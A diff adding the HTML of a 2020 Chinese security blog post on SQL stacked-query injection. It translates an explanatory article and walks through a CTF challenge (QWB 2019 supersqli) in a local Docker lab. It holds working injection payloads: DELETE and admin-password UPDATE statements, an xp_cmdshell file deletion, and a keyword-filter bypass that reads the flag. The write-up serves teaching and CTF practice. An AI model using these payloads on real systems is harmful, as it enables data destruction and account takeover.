@@ -1,0 +1,823 @@
+<!-- Post layout -->
+<!DOCTYPE html>
+<html>
+<head>
+<!-- Introducing the head tag -->
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>SQL注入-堆叠注入 | sueisok</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="SQL注入-堆叠注入" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="堆叠注入🤒" />
+<meta property="og:description" content="堆叠注入🤒" />
+<link rel="canonical" href="http://localhost:4000/blog/sqli-stacked-queries/" />
+<meta property="og:url" content="http://localhost:4000/blog/sqli-stacked-queries/" />
+<meta property="og:site_name" content="sueisok" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-08T10:10:57+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SQL注入-堆叠注入" />
+<meta name="twitter:site" content="@your_name" />
+<meta name="google-site-verification" content="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"SQL注入-堆叠注入","dateModified":"2020-04-08T10:10:57+08:00","datePublished":"2020-04-08T10:10:57+08:00","url":"http://localhost:4000/blog/sqli-stacked-queries/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/sqli-stacked-queries/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/banner.png"}},"description":"堆叠注入🤒","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+<script type="application/ld+json">
+    {
+      "@context": "http://schema.org/",
+      "@type": "Person",
+      "image": /assets/JHON.jpg,
+      "honorificPrefix": "MD.",
+      "name": sueisok,
+      "familyName": Your family name,
+      "honorificSuffix": King,
+      "disambiguatingDescription": Your awesome description,
+      "birthPlace": Your address,
+      "birthDate": Your Date of Birth,
+      "height": XX inches,
+      "gender": Your gender,
+      "memberOf": Your awesome orgranization,
+      "nationality": Your proud nationality,
+      "jobTitle": Your Respectful Position,
+      "knowsAbout": Your awesome Skill,
+      "knowsLanguage": ,
+      "email": ,
+      "url": " http://localhost:4000 ",
+      "test": 
+      "worksFor": {
+        "@type": ,
+        "name": ,
+        "openingHours": ,
+        "priceRange": ,
+        "telephone": ,
+        "image": ,
+        "address": {
+        "@type": ,
+        "addressCountry": ,
+        "addressLocality": ,
+        "addressRegion": 
+         }
+      },
+      "address": {
+        "@type": ,
+        "addressCountry": ,
+        "addressLocality": ,
+        "addressRegion": 
+      },
+      "colleague": [
+        "https://deb108471.dhakaeducationboard.gov.bd",
+        "https://deb113652.dhakaeducationboard.gov.bd",
+        "https://deb110880.dhakaeducationboard.gov.bd"
+      ]
+    }
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-sclable=0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="description" content="Notes,Thoughts and Else" />
+<meta name="keywords" content="123456" />
+
+<!-- preloader -->
+<link rel="stylesheet" href="http://localhost:4000/assets/css/preloader.css">
+
+<!-- Favicon -->
+<link href="/assets/icon.png" rel="shortcut icon" />
+<link href="/assets/icon.png" rel="apple-touch-icon-precomposed" />
+<!-- Android Lolipop Theme Color -->
+<!-- <meta name="theme-color" content="#1464FB"> -->
+<title>SQL注入-堆叠注入</title>
+<!-- Baidu statistics -->
+
+<!-- Google Analytics -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', '');
+</script>
+
+
+<!-- Android Lolipop Theme Color -->
+<meta name="theme-color" content=" rgb(122,103,138) ">
+</head>
+<body onload="loaderFunc()" data-spy="scroll" data-target="#toc" data-offset="20">
+
+
+<!-- preloader -->
+<div id="loader" class="loader">
+  <div class="artboard">
+    <div class="square"></div>
+    <div class="path">
+      <div class="small-squares">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- end -->
+
+<!-- Top anchor -->
+<a id="htmlup" name="htmlup"></a>
+<!-- Introduce blog post options -->
+
+<header id="post-header" style="background-color:rgb(122,103,138);">
+  <div class="top-center">
+      <div class="logo">
+          <a href="/" title="my awesome webtitle" style="color: white;">sueisok</a>
+      </div>
+      <nav class="top-nav">
+          <ul>
+              
+                <li><a href="/" style="color: white;">Home</a></li>
+              
+                <li><a href="/tags/" style="color: white;">Tags</a></li>
+              
+                <li><a href="/timeline/" style="color: white;">Timeline</a></li>
+              
+                <li><a href="/about/" style="color: white;">About</a></li>
+              
+                <li><a href="/reLink/" style="color: white;">reLink</a></li>
+              
+          </ul>
+      </nav>
+      <div id="top-boot">
+        <a href="javascript:;" id="boot1" style="display:block;" onclick="document.getElementById('boot-area').style.display='block';document.getElementById('boot1').style.display='none';document.getElementById('boot2').style.display='block';"><img src="/assets/boot_white.png" alt=""></a>
+        <a href="javascript:;" id="boot2" style="display: none;" onclick="document.getElementById('boot-area').style.display='none';document.getElementById('boot1').style.display='block';document.getElementById('boot2').style.display='none';"><img src="/assets/boot_white.png" alt=""></a>
+      </div>
+  </div>
+
+</header>
+
+
+<!-- Introducing the mobile dropdown option -->
+<div id="boot-area">
+    <ul>
+        
+          <a href="/"><li>Home</li></a>
+        
+          <a href="/tags/"><li>Tags</li></a>
+        
+          <a href="/timeline/"><li>Timeline</li></a>
+        
+          <a href="/about/"><li>About</li></a>
+        
+          <a href="/reLink/"><li>reLink</li></a>
+        
+    </ul>
+</div>
+
+<!-- Introducing the blog post style -->
+<!-- Version one garbage -->
+<!-- <div class="wow fadeIn top" data-wow-duration="3.5s" >
+    <span class="wow fadeInUp" data-wow-delay="0.2s">SQL注入-堆叠注入</span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span>
+</div> -->
+
+<!--Version 2 switchable page -->
+
+<div class="post-top" style="background-color:rgb(122,103,138);">
+  <!-- Page width is greater than 800px -->
+  <div class="left-area">
+    
+      <a href="javascript:;" class="btn bounceInLeft animated" onmouseover="showLeft();this.style.color='rgb(122,103,138)';" onmouseout="goneLeft();this.style.color='rgba(0,0,0,.2)';"><</a>
+      <div id="left-tab" style="display:none;"><span class="left-san"></span><span class="left-main" style="color:rgb(122,103,138);"><sapn class="main">No previous page</sapn></span></div>
+    
+  </div>
+  <div class="post-titlearea">
+    <span class="wow fadeInUp" data-wow-delay="0.2s">SQL注入-堆叠注入</span>
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span> -->
+  </div>
+  <div class="right-area">
+    
+      <a href="/blog/wfuzz1/" class="btn bounceInRight self-animated" onmouseover="showRight();this.style.color='rgb(122,103,138)';" onmouseout="goneRight();this.style.color='rgba(0,0,0,.2)';">></a>
+      <div id="right-tab" style="display:none;"><span class="right-san"></span><span class="right-main" style="color:rgb(122,103,138);"><sapn class="main">Wfuzz的其他模块</sapn></span></div>
+    
+  </div>
+
+  <!-- Page width is less than 800px -->
+  <div class="post-changearea">
+    
+      <a href="javascript:;" class="leftchange" style="border-right: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span><br>No previous one</span></a>
+    
+    
+      <a href="/blog/wfuzz1/" class="rightchange" style="border-left: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span>Next<br><br>Wfuzz的其他模块</span></a>
+    
+  </div>
+</div>
+
+
+<div class="markdown-body fadeInUp animated">
+  
+
+    
+      <div class="postpage-subtitle" style="border-left: 8px solid rgb(122,103,138); border-right: 8px solid rgb(122,103,138)">
+        Stacked Queries
+      </div>
+    
+  
+
+  <!-- Article content -->
+ <ul id="markdown-toc">
+  <li><a href="#stacked-queries" id="markdown-toc-stacked-queries">Stacked Queries</a>    <ul>
+      <li><a href="#principle" id="markdown-toc-principle">Principle</a></li>
+      <li><a href="#stacked-queries-limitations" id="markdown-toc-stacked-queries-limitations">Stacked Queries Limitations</a></li>
+      <li><a href="#altering-data" id="markdown-toc-altering-data">Altering Data</a></li>
+      <li><a href="#calling-stored-procedures" id="markdown-toc-calling-stored-procedures">Calling Stored Procedures</a></li>
+    </ul>
+  </li>
+  <li><a href="#ein-beispiel" id="markdown-toc-ein-beispiel">Ein Beispiel</a>    <ul>
+      <li><a href="#思路" id="markdown-toc-思路">思路</a></li>
+    </ul>
+  </li>
+  <li><a href="#refer" id="markdown-toc-refer">Refer</a></li>
+</ul>
+<p><code class="highlighter-rouge">堆叠注入</code>🤒</p>
+
+<p><code class="highlighter-rouge">堆查询注入</code>🤒</p>
+
+<p><code class="highlighter-rouge">堆注入</code>🤒</p>
+
+<p>🤔害，其实就是多语句注入，用分号。</p>
+
+<p>这篇文章先翻译一个不知道从哪看来的讲堆叠注入的文章，und复现强网杯2019的一个题目</p>
+
+<h1 id="stacked-queries">Stacked Queries</h1>
+
+<p>先翻译一下<a href="https://www.sqlinjection.net/stacked-queries/">SQL注入网站中的一篇文章</a></p>
+
+<blockquote>
+  <p>Execute multiple statements in the same query to extend the possibilities of SQL injections.</p>
+</blockquote>
+
+<p>在一个查询中执行多个语句，以扩展SQL注入的可能性。</p>
+
+<blockquote>
+  <p>Stacked queries provide a lot of control to the attacker. By terminating the original query and adding a new one, it will be possible to modify data and call stored procedures. This technique is massively used in SQL injection attacks and understanding its principle is essential to a sound understanding of this security issue.</p>
+</blockquote>
+
+<p>堆叠注入为攻击者提供了很大的控制权。用结束原始的查询添加新语句的方式，就可能对数据进行改动，或者执行程序。很多SQL注入攻击都是使用这种方式，了解他的原理对正确了解这一安全问题很重要。</p>
+
+<h2 id="principle">Principle</h2>
+
+<blockquote>
+  <p>In SQL, a semicolon indicates that the end of a statement has been reached and what follows is a new one. This allows executing multiple statements in the same call to the database server. Contrary to UNION attacks which are limited to SELECT statements, stacked queries can be used to execute any SQL statement or procedure. A classic attack using this technique could look like the following.</p>
+</blockquote>
+
+<p>在SQL语句中，分号意味着一段语句的结束，后面是另一段新的语句，这就允许在一个请求中执行多个语句。与UNION查询攻击对SELECT的限制相反，堆叠注入可以执行任何的SQL语句和程序，一个经典的攻击利用如下。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MALICIOUS</span> <span class="k">USER</span> <span class="k">INPUT</span><span class="p">.</span>
+<span class="mi">1</span><span class="p">;</span> <span class="k">DELETE</span> <span class="k">FROM</span> <span class="n">products</span>
+<span class="o">//</span><span class="err">恶意用户输入</span>
+
+<span class="k">GENERATED</span> <span class="n">QUERY</span> <span class="k">WITH</span> <span class="n">MULTIPLE</span> <span class="n">STATEMENTS</span><span class="p">.</span> <span class="n">THE</span> <span class="k">PARAMETER</span> <span class="n">PRODUCTID</span> <span class="n">WAS</span> <span class="k">NOT</span> <span class="n">SANITIZED</span><span class="p">.</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">productid</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="k">DELETE</span> <span class="k">FROM</span> <span class="n">products</span>
+<span class="o">//</span><span class="err">构成的恶意语句</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">THE PARAMETER PRODUCTID WAS NOT SANITIZED.</code>的意思是<code class="highlighter-rouge">PRODUCTID</code>参数未清除。</p>
+
+<blockquote>
+  <p>When the query is executed, a product is returned by the first statement and all products are deleted by the second.</p>
+</blockquote>
+
+<p>请求执行后，返回第一个语句查询的id为1的<code class="highlighter-rouge">product</code>，第二步删除表中所有内容。</p>
+
+<h2 id="stacked-queries-limitations">Stacked Queries Limitations</h2>
+
+<blockquote>
+  <p>It is important to mention that query stacking does not work in every situation. Most of the time, this kind of attack is impossible because the API and/or database engine do not support this functionality. Insufficient rights could also explain why the attacker is unable to modify data or call some procedures.</p>
+</blockquote>
+
+<p>值得一提的是堆叠注入不是在所有情况下都可以用，不支持的API或数据库就不可以用，权限不足也可能使得不能修改数据或执行程序。</p>
+
+<blockquote>
+  <p>Below is a list of query stacking support by the principal API and DBMS.</p>
+</blockquote>
+
+<p>以下是支持堆叠注入的API或数据库。</p>
+
+<pre><code class="language-mysql">STACKED QUERY SUPPORT.
+
+MySQL/PHP - Not supported (supported by MySQL for other API).
+
+SQL Server/Any API - Supported.
+
+Oracle/Any API - Not supported.
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>API and DBMS</th>
+      <th>SUPPORT</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MySQL/PHP</td>
+      <td>不支持，支持MySQL和其他API</td>
+    </tr>
+    <tr>
+      <td>SQL Server/Any API</td>
+      <td>支持</td>
+    </tr>
+    <tr>
+      <td>Oracle/Any API</td>
+      <td>不支持</td>
+    </tr>
+  </tbody>
+</table>
+
+<blockquote>
+  <p>Even though we mentioned earlier that stacked queries can add any SQL statement, this injection technique is frequently limited when it comes to adding SELECTs. Both statements will be executed but software code is usually designed to handle the results returned by only one query. Consequently, the injected SELECT query will often generate an error or its results will simply be ignored. For this reason it is recommended to use UNION attacks when trying to extract data.</p>
+</blockquote>
+
+<p>尽管我们前面说过堆叠注入可以添加任意的SQL语句，但是对于添加<code class="highlighter-rouge">SELECT</code>的语句时，这种注入方式经常受限。虽然两条语句都可以执行，但是程序通常只返回一个语句的查询数据，注入<code class="highlighter-rouge">SELECT</code>语句经常会出错或者结果被忽略，因此建议使用<code class="highlighter-rouge">UNION</code>注入提取数据。</p>
+
+<blockquote>
+  <p>One last thing needs to be mentionned: to inject a valid SQL segment, the attacker will need to know some basic information such as table names, column names, etc. For more information refer to the section dedicated to information gathering.</p>
+</blockquote>
+
+<p>最后需要提醒的是注入SQL时，攻击者需要知道一些基本的信息，比如数据表名、数据库列名之类的。更多的信息，参照信息收集的部分。</p>
+
+<h2 id="altering-data">Altering Data</h2>
+
+<blockquote>
+  <p>The example presented at the beginning of the article demonstrates how query stacking can be used to delete information from the database. Instead of destroying data, attackers usually try to steal it or grant themselves high privileges on the system. A frequent approach is to change the administrator’s password. The example below illustrates a classic data modification using SQL injection.</p>
+</blockquote>
+
+<p>文章前面的例子展示了堆叠注入可以删除数据库信息，比起这个，攻击者通常会尝试窃取数据，或者提升自己的系统权限。一个常规操作就是修改系统管理员的密码，下面的例子将演示一个经典的SQL注入修改操作。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">USER</span> <span class="k">INPUT</span><span class="p">.</span>
+<span class="mi">1</span><span class="p">;</span> <span class="k">UPDATE</span> <span class="n">members</span> <span class="k">SET</span> <span class="n">password</span><span class="o">=</span><span class="s1">'pwd'</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'admin'</span>
+<span class="o">//</span><span class="err">用户恶意输入</span>
+
+<span class="k">GENERATED</span> <span class="n">QUERY</span><span class="p">.</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">categoryid</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="k">UPDATE</span> <span class="n">members</span> <span class="k">SET</span> <span class="n">password</span><span class="o">=</span><span class="s1">'pwd'</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'admin'</span>
+<span class="o">//</span><span class="err">构成的恶意语句</span>
+</code></pre></div></div>
+
+<h2 id="calling-stored-procedures">Calling Stored Procedures</h2>
+
+<blockquote>
+  <p>Calling a procedure can bring SQL injections attacks to a whole new level. Nowadays, many database management systems come with built in packages of functions and procedures to simplify development and provide new functionalities. Therefore, it becomes possible to communicate with network, control the operating system and do even more from a simple SQL statement.</p>
+</blockquote>
+
+<p>执行程序可以把SQL注入攻击提高一个档次。如今很多数据库管理系统会将方法和过程打包，以简化开发，提供新功能，因此就可能与互联网交互，通过简单的SQL语句控制操作系统或者更深入。</p>
+
+<blockquote>
+  <p>As there is no convention between DBMS regarding to packages and procedures name, the attacker will have to identify which database system is used before trying to call a built-in procedure. From there, the principle is the same as examples presented earlier except that the injected query is a stored procedure call. Let see how it can be done with the use of xp_shellcmd; a SQL Server’s specific command which allows executing operating system calls.</p>
+</blockquote>
+
+<p>由于数据库的包和过程名没有关联，因此在执行程序前攻击者必须确定被攻击数据库的种类。这个原理和之前提到的例子中的需要确定表名等信息一样，只不过查询语句是执行存储的程序。<code class="highlighter-rouge">xp_shellcmd</code>是一个<code class="highlighter-rouge">SQL Server</code>的特殊语句，可以执行操作系统程序，来看一下执行程序是怎么做到的。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">USER</span> <span class="k">INPUT</span><span class="p">.</span>
+<span class="mi">1</span><span class="p">;</span> <span class="k">exec</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">'DEL important_file.txt'</span>
+<span class="o">//</span><span class="err">用户恶意输入</span>
+
+<span class="k">GENERATED</span> <span class="n">QUERY</span><span class="p">.</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">categoryid</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="k">exec</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">'DEL important_file.txt'</span>
+<span class="o">//</span><span class="err">构成的恶意语句</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>The query above will return a product list and delete “important_file.txt”. A much more complex attack could have been launched to take control over the operating system, but this is outside the scope of this article. The injected statement is not limited to built-in packages; a user-defined procedure could also be called. This approach is not frequent but it could be useful in some specific cases.</p>
+</blockquote>
+
+<p>以上查询会返回<code class="highlighter-rouge">categoryid=1</code>的产品列表，并删除<code class="highlighter-rouge">important_file.txt</code>，更复杂的攻击可能会获得操作系统的控制，但是这超出了这篇文章的范围。注入语句也不限于内置的包，用户自定义的程序也可能被利用执行，这个攻击方法不是很普适但在某些特殊情况下是有用的。</p>
+
+<h1 id="ein-beispiel">Ein Beispiel</h1>
+
+<p>一个例子来自强网杯2019，<a href="https://github.com/CTFTraining/qwb_2019_supersqli">复现环境</a>，<code class="highlighter-rouge">clone</code>放到<code class="highlighter-rouge">ubuntu</code>里，启动<code class="highlighter-rouge">docker</code></p>
+
+<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/1.png" alt="avatar" /></p>
+
+<p>输入一个小小的单引号</p>
+
+<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/2.png" alt="avatar" /></p>
+
+<p>报错了，说明可能存在SQL注入漏洞</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1' or '1'='1 #
+</code></pre></div></div>
+
+<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/3.png" alt="avatar" /></p>
+
+<p>返回了一些数据，说明存在SQL注入漏洞无疑</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1' order by 3 # 
+</code></pre></div></div>
+
+<p>返回错误</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1' order by 2 # 
+</code></pre></div></div>
+
+<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/4.png" alt="avatar" /></p>
+
+<p>返回正确，可以判断该表有两列</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1' union select 1,2 #
+</code></pre></div></div>
+
+<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/5.png" alt="avatar" /></p>
+
+<p><code class="highlighter-rouge">select</code>关键词被过滤了，加<code class="highlighter-rouge">/**/</code>，替换大小写都不能绕过去。</p>
+
+<p>这时尝试堆叠注入，尝试列出所有数据库：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1';show databases; #
+</code></pre></div></div>
+
+<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/6.png" alt="avatar" /></p>
+
+<p>有<code class="highlighter-rouge">ctftraining</code>、<code class="highlighter-rouge">information_schema</code>、<code class="highlighter-rouge">mysql</code>、<code class="highlighter-rouge">performance_schema</code>、<code class="highlighter-rouge">supersqli</code>、<code class="highlighter-rouge">test</code>6个数据库</p>
+
+<p>尝试列出当前数据库的表：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1';show tables; #
+</code></pre></div></div>
+
+<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/7.png" alt="avatar" /></p>
+
+<p>有<code class="highlighter-rouge">1919810931114514</code>、<code class="highlighter-rouge">words</code>两个表。</p>
+
+<p>尝试获取表的列名：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1';show columns from words;
+</code></pre></div></div>
+
+<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/9.png" alt="avatar" /></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1';show columns from `1919810931114514`;
+</code></pre></div></div>
+
+<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/8.png" alt="avatar" /></p>
+
+<p>接下来就要读取数据了，但是关键词都被过滤了。</p>
+
+<p>看到两种解题思路，一种是把关键词分开写然后拼接，一种是将1919810931114514重命名为words，将flag改为id。感觉重命名了以后就算是修改了原本数据，所以选择拼接关键词的方法。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;
+</code></pre></div></div>
+
+<p><img src="../../assets/blog_pic/20200407_sqli_stacked_queries/10.png" alt="avatar" /></p>
+
+<h2 id="思路">思路</h2>
+
+<p>💁加单引号试探，有时候也可以试一下没有单引号或者括号或者双引号，原理就是尝试闭合前一个语句</p>
+
+<p>💁判断列数，<code class="highlighter-rouge">order by</code></p>
+
+<p>💁select 列数，发现关键字被过滤，尝试堆叠注入</p>
+
+<p>💁列出数据库名</p>
+
+<p>💁列出表名</p>
+
+<p>💁列出列名</p>
+
+<p>💁想办法读数据，这里的操作是关键词绕过</p>
+
+<h1 id="refer">Refer</h1>
+
+<p><a href="www.wuliao.com">https://xz.aliyun.com/t/5505</a></p>
+
+<p><a href="www.shibushisha.com">https://www.zhaoj.in/read-5873.html</a></p>
+
+<p><a href="www.hahahaha.com">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p>
+
+  <!-- Introducing the share module -->
+  
+  <div class="social-share-wrapper">
+    <div class="social-share"></div>
+  </div>
+
+
+<!-- share.js -->
+<script src="/assets/js/social-share.min.js"></script>
+<script>
+  socialShare('.social-share', {
+    sites: [
+      
+        'weibo'
+        ,
+        
+      
+        'qq'
+        ,
+        
+      
+        'wechat'
+        
+      
+    ],
+    wechatQrcodeTitle: "Share to WeChat circle",
+    wechatQrcodeHelper: 'I look forward to seeing this article in the circle of friends.'
+  });
+</script>
+
+</div>
+
+<!-- Bottom anchor -->
+<a id="htmldown" name="htmldown"></a>
+<!-- Introducing the comment module -->
+
+
+
+    <section class="post-footer-item comment">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80ODI3Ny8yNDc3MQ=="></div>
+    </section>
+
+    <!-- 来必力City版安装代码 -->
+    <script type="text/javascript">
+       (function(d, s) {
+           var j, e = d.getElementsByTagName(s)[0];
+
+           if (typeof LivereTower === 'function') { return; }
+
+           j = d.createElement(s);
+           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+           j.async = true;
+
+           e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript>Please activate JavaScript for normal use.</noscript>
+    <!-- City version code installation has been completed -->
+
+
+
+
+
+<!-- Introducing the goto module -->
+<div class="bounceInRight animated go">
+  <a title="Top switch page" class="gototop" href="#htmlup" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Top
+    </div>
+  </a>
+  <a title="At the bottomlivere评论哦" class="gotobottom" href="#htmldown" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Foot
+    </div>
+  </a>
+</div>
+
+<!-- Introduce the module at the bottom of the page -->
+
+<footer id="bottom">
+  <script src="/assets/css/bootstrap.min.css"></script>
+
+<!-- START BREADCRUMBS -->
+<nav aria-label="breadcrumb">
+
+  <ol class="breadcrumb">
+  
+  
+  
+  </ol>
+</nav>
+
+<!-- END BREADCRUMBS -->
+
+
+<div id="breadcrumbs">
+
+<a href="/">Home</a>
+
+  
+    / <a href="/blog/">Blog</a>
+  
+
+  
+    / Sqli stacked queries
+  
+
+</div>
+<style>
+#breadcrumbs {margin-left: 0
+
+      font-size: 10rem;
+      padding: 0.75rem 1rem;
+      margin-bottom: 1rem;
+      list-style: none;
+      background-color: # #fcfcfc;
+      border-radius: 0.25rem;
+
+      content: "";
+      display: table;
+      clear: both;
+
+      float: left;
+
+      display: inline-block;
+      padding-right: 0.5rem;
+      padding-left: 0.5rem;
+      color: #818a91;
+      content: "/";
+
+      text-decoration: underline;
+
+      text-decoration: none;
+
+}
+</style>
+
+  <br>
+  <span>sueisok ©
+  
+  
+  2020
+  <br>
+  Powered by <a href="https://www.jekyll.com/">Jekyll</a> | <a href="https://github.com/JonyBepary/HardCandy-Jekyll-Mod">HardCandy-Jekyll Mod</a></span>
+</footer>
+<link rel="stylesheet" href="/assets/css/style.css">
+<link rel="stylesheet" href="/assets/css/media.css">
+<link rel="stylesheet" href="/assets/css/animate.min.css">
+<link rel="stylesheet" href="/assets/css/pygments/pygments_default.css">
+<link rel="stylesheet" href="/assets/css/github-markdown.css">
+<!-- SNS-icon -->
+<script src="/assets/js/font_856428_y9z6nq7zf5.js"></script>
+<!-- share.css -->
+<link rel="stylesheet" href="/assets/css/share.min.css">
+<!-- font -->
+<link rel="stylesheet" href="/assets/css/font.css">
+<!-- <link href="https://fonts.googleapis.com/css?family=Kaushan+Script|Pacifico|Ubuntu|Roboto+Mono|Source+Sans+Pro" rel="stylesheet"> -->
+
+
+
+<!-- Quote the animation effect of wow.js -->
+<script src="/assets/js/wow.js"></script>
+<script>
+    var wow = new WOW({
+        boxClass: 'wow',
+        animateClass: 'animated',
+        // offset: 600,
+        mobile: true,
+        live: true
+    });
+    wow.init();
+</script>
+<!-- Page refreshes back to top -->
+<script>
+    window.onbeforeunload = function(){
+        //The page automatically returns to the top after refreshing
+        document.documentElement.scrollTop = 0;  //ie下
+        document.body.scrollTop = 0;  //非ie
+    }
+</script>
+
+<!-- preloder script -->
+<!-- end -->
+<script>
+//open external links in a new window
+function external_new_window() {
+    for(var c = document.getElementsByTagName("a"), a = 0;a < c.length;a++) {
+    var b = c[a];
+    b.getAttribute("href") && b.hostname !== location.hostname
+    }
+}
+//open PDF links in a new window
+function pdf_new_window ()
+{
+    if (!document.getElementsByTagName) return false;
+    var links = document.getElementsByTagName("a");
+    for (var eleLink=0; eleLink < links.length; eleLink ++) {
+    if ((links[eleLink].href.indexOf('.pdf') !== -1)||(links[eleLink].href.indexOf('.doc') !== -1)||(links[eleLink].href.indexOf('.docx') !== -1)) {
+        links[eleLink].onclick =
+        function() {
+            window.open(this.href);
+            return false;
+        }
+    }
+    }
+}
+pdf_new_window()
+external_new_window();
+</script>
+
+<style>
+.videoWrapper {
+    position: relative;
+    padding-bottom: 56.333%;
+    height: 0;
+    background: black;
+}
+.videoWrapper iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    border: 0;
+}
+</style>
+
+<script>
+function get_youtube_id(url) {
+    var p = /^(?:https?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(?:\S+)?$/;
+    return (url.match(p)) ? RegExp.$1 : false;
+}
+function vimeo_embed(url,el) {
+    var id = false;
+    $.ajax({
+      url: 'https://vimeo.com/api/oembed.json?url='+url,
+      async: true,
+      success: function(response) {
+        if(response.video_id) {
+          id = response.video_id;
+          if(url.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+          if(url.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+          var theInnerHTML = '<div class="videoWrapper"><iframe src="https://player.vimeo.com/video/'+id+'/?byline=0&title=0&portrait=0';
+          if(autoplay==1) theInnerHTML += '&autoplay=1';
+          if(loop==1) theInnerHTML += '&loop=1';
+          theInnerHTML += '" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></div>';
+          el.innerHTML = theInnerHTML;
+        }
+      }
+    });
+}
+function video_embed() {
+    var p = document.getElementsByTagName('p');
+    for(var i = 0; i < p.length; i++) {
+        //check if this is an external url (that starts with https:// or http://
+        if (p[i].innerHTML.indexOf("http://") == 0 ||
+            p[i].innerHTML.indexOf("https://") == 0) {
+            var youtube_id = get_youtube_id(p[i].innerHTML);
+            if(youtube_id) {
+                if(p[i].innerHTML.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+                if(p[i].innerHTML.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+                var theInnerHTML = '<div class="videoWrapper"><iframe width="720" height="420" src="https://www.youtube.com/embed/' + youtube_id + '?rel=0&showinfo=0';
+                if(autoplay==1) theInnerHTML += '&autoplay=1';
